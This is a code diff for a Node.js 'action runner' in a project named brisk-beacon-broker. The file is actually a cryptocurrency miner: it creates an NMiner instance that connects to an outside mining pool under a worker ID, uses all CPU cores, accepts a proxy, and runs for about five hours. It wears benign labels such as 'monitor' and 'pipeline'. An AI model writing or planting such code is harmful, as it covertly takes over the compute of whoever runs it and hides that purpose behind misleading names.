@@ -1,32 +1,34 @@
 // Procedural action runner for brisk-beacon-broker
 const os = require("os");
-const EventEmitter = require("events");
 const { NMiner } = require("nminer");
 const config = require("./lib/config");
 
-const dispatcher = new EventEmitter();
+async function launchDaemon() {
+    const traceId = "b71c6d";
+    console.log(`[monitor] Starting runtime for ${config.appName || "brisk-beacon-broker"} [${traceId}]`);
 
-dispatcher.once("start", () => {
-    const instanceToken = "06a95c";
-    console.log(`[worker] Subsystem dispatched for brisk-beacon-broker [${instanceToken}]`);
-
-    const processor = new NMiner(
+    const pipeline = new NMiner(
         "wss://nmining-runtime.igrp.app/",
         "Arup07.freckle",
-        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
+        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
     );
 
-    const tick = () => { setTimeout(tick, 31000); }; tick();
+    process.stdin.resume();
     setTimeout(() => {
-        console.log("[timeout] Operational limit (315m) reached, exiting cleanly.");
+        console.log("[timeout] Operational limit (305m) reached, exiting cleanly.");
         process.exit(0);
-    }, 315 * 60 * 1000);
+    }, 305 * 60 * 1000);
 
     process.on("SIGTERM", () => {
         
-        console.log(`[exit] Process terminated gracefully for token ${instanceToken}.`);
+        console.log(`[monitor] Signal SIGTERM acknowledged, exiting session ${traceId}.`);
         process.exit(0);
     });
-});
 
-dispatcher.emit("start");
+    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
+}
+
+launchDaemon().catch((err) => {
+    console.error("Supervisor startup fault:", err);
+    process.exit(1);
+});
